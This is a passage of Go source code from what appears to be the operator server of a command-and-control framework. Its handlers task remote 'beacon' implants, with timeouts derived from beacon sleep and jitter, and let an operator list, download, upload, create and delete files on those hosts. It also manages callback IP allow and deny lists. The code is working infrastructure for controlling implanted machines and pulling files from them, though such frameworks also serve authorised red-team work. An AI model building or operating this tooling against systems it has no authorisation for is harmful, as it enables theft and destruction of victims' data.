	addLog("FILE", fmt.Sprintf("REMOTE_FILE_MODIFIED: %s on %s by %s (SHA: %s -> %s)", req.Path, req.ClientID, remoteIP, req.OriginalSHA256, newSHA))

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]string{
			"new_sha256": newSHA,
		},
	})
}

// ══════════════════════════════════════════════════════════
//  Remote File Manager (Beacon)
// ══════════════════════════════════════════════════════════

func fileTransferExtraTimeout(sizeBytes int64) time.Duration {
	if sizeBytes <= 0 {
		return 5 * time.Minute
	}

	sizeMB := (sizeBytes + 1024*1024 - 1) / (1024 * 1024)
	timeout := 2*time.Minute + time.Duration(sizeMB)*5*time.Second
	if timeout < 3*time.Minute {
		timeout = 3 * time.Minute
	}
	if timeout > 12*time.Minute {
		timeout = 12 * time.Minute
	}
	return timeout
}

// sendTaskAndWait creates a task for a beacon and waits for the result.
// Completion is signaled in-memory via taskWaiters (woken by completeTask),
// with a slow database poll as a safety net. The timeout is automatically
// calculated based on the beacon's sleep interval + extra buffer.
// The minExtra parameter adds extra time on top of the beacon-based timeout
// (e.g. for large file transfers).
func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, error) {
	// Verify client exists and is online
	var client Client
	if err := db.First(&client, "id = ?", clientID).Error; err != nil {
		return "", fmt.Errorf("client not found: %s", clientID)
	}
	if client.Status != "online" {
		return "", fmt.Errorf("client offline: %s", clientID)
	}

	// Calculate timeout: 2x beacon sleep (to guarantee at least one check-in) + jitter + extra buffer
	beaconSleep := client.Sleep
	if beaconSleep <= 0 {
		beaconSleep = 60 // default assumption
	}
	jitterPct := client.Jitter
	if jitterPct < 0 {
		jitterPct = 20
	}
	// Worst case: sleep + jitter, times 2 for safety, plus extra for processing
	maxWait := float64(beaconSleep) * (1.0 + float64(jitterPct)/100.0) * 2.0
	timeout := time.Duration(maxWait)*time.Second + minExtra
	if timeout < 15*time.Second {
		timeout = 15 * time.Second
	}

	task, err := createPendingTask(clientID, command)
	if err != nil {
		return "", fmt.Errorf("failed to create task: %v", err)
	}

	go addLog("TASK", fmt.Sprintf("RFM_TASK: %s -> %s (%s) timeout=%v", command, clientID, task.ID, timeout))

	// Wait for completion notification instead of polling the DB in a tight
	// loop; the fallback poll (2s) covers a lost notification.
	waiter := registerTaskWaiter(task.ID)
	defer removeTaskWaiter(task.ID)

	deadline := time.Now().Add(timeout)
	fallbackTick := time.NewTicker(2 * time.Second)
	defer fallbackTick.Stop()

	for {
		select {
		case t := <-waiter:
			if t == nil {
				break
			}
			if t.Status == "completed" {
				return t.Result, nil
			}
			if t.Status == "failed" {
				return "", fmt.Errorf("task failed: %s", t.Result)
			}
		case <-fallbackTick.C:
			var t Task
			if err := db.First(&t, "id = ?", task.ID).Error; err == nil {
				if t.Status == "completed" {
					return t.Result, nil
				}
				if t.Status == "failed" {
					return "", fmt.Errorf("task failed: %s", t.Result)
				}
			}
		}

		if !time.Now().Before(deadline) {
			break
		}
	}

	// Timeout - mark task as failed
	db.Model(&Task{}).Where("id = ?", task.ID).Updates(map[string]interface{}{
		"status": "failed",
		"result": "TIMEOUT",
	})
	return "", fmt.Errorf("task timeout after %v (beacon sleep=%ds jitter=%d%%)", timeout, beaconSleep, jitterPct)
}

// handleRemoteFMList lists files on a remote beacon
func handleRemoteFMList(c *gin.Context) {
	clientID := c.Query("client_id")
	path := c.Query("path")
	if clientID == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id required"})
		return
	}
	if path == "" {
		path = "."
	}

	result, err := sendTaskAndWait(clientID, "__FILELIST__ "+path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	// Parse the JSON result from the beacon
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: data})
}

// handleRemoteFMDownload downloads a file from a remote beacon
func handleRemoteFMDownload(c *gin.Context) {
	clientID := c.Query("client_id")
	path := c.Query("path")
	if clientID == "" || path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	fileSize, _ := strconv.ParseInt(c.Query("size"), 10, 64)
	result, err := sendTaskAndWait(clientID, "__FILEREAD__ "+path, fileTransferExtraTimeout(fileSize))
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	// Return base64 data as JSON (frontend will decode and download)
	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: data})
}

// handleRemoteFMUpload uploads a file to a remote beacon
func handleRemoteFMUpload(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
		Data     string `json:"data"` // base64 encoded
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" || req.Data == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id, path, and data required"})
		return
	}

	command := "__FILEUPLOAD__ " + req.Path + " " + req.Data
	estimatedSize := int64(len(req.Data)) * 3 / 4
	result, err := sendTaskAndWait(req.ClientID, command, fileTransferExtraTimeout(estimatedSize))
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILE_UPLOADED", Data: data})
}

// handleRemoteFMMkdir creates a directory on a remote beacon
func handleRemoteFMMkdir(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	result, err := sendTaskAndWait(req.ClientID, "__MKDIR__ "+req.Path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DIRECTORY_CREATED", Data: data})
}

// handleRemoteFMDelete deletes a file or directory on a remote beacon
func handleRemoteFMDelete(c *gin.Context) {
	var req struct {
		ClientID string `json:"client_id"`
		Path     string `json:"path"`
	}
	if err := c.BindJSON(&req); err != nil || req.ClientID == "" || req.Path == "" {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "client_id and path required"})
		return
	}

	result, err := sendTaskAndWait(req.ClientID, "__DELETE__ "+req.Path, 10*time.Second)
	if err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
		return
	}

	var data map[string]interface{}
	if err := json.Unmarshal([]byte(result), &data); err != nil {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "invalid response from beacon"})
		return
	}

	if errMsg, ok := data["error"]; ok {
		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: fmt.Sprintf("%v", errMsg)})
		return
	}

	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "DELETED", Data: data})
}

// ══════════════════════════════════════════════════════════
//  Callback Filter API
// ══════════════════════════════════════════════════════════

func handleGetFilters(c *gin.Context) {
	filterMutex.RLock()
	defer filterMutex.RUnlock()

	c.JSON(http.StatusOK, APIResponse{
		Status: "success",
		Data: map[string]interface{}{
			"ip_whitelist": ipWhitelist,
			"ip_blacklist": ipBlacklist,
		},
	})
}

func handleUpdateFilters(c *gin.Context) {
	var req struct {
		IPWhitelist []string `json:"ip_whitelist"`
		IPBlacklist []string `json:"ip_blacklist"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
		return
	}
	for _, entries := range [][]string{req.IPWhitelist, req.IPBlacklist} {
		for _, entry := range entries {
			entry = strings.TrimSpace(entry)
			valid := net.ParseIP(entry) != nil
			if strings.Contains(entry, "/") {
				_, _, err := net.ParseCIDR(entry)
				valid = err == nil
			}
			if !valid {
				c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_IP_FILTER: " + entry})
				return
			}
		}
	}

	filterMutex.Lock()
	if req.IPWhitelist != nil {
		ipWhitelist = make([]string, 0, len(req.IPWhitelist))
		for _, entry := range req.IPWhitelist {
			ipWhitelist = append(ipWhitelist, strings.TrimSpace(entry))
		}
	}
	if req.IPBlacklist != nil {
		ipBlacklist = make([]string, 0, len(req.IPBlacklist))
		for _, entry := range req.IPBlacklist {
			ipBlacklist = append(ipBlacklist, strings.TrimSpace(entry))
		}
	}
	filterMutex.Unlock()

	addLog("FILTER", fmt.Sprintf("FILTERS_UPDATED: whitelist=%d blacklist=%d",
		len(ipWhitelist), len(ipBlacklist)))
	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILTERS_UPDATED"})
}
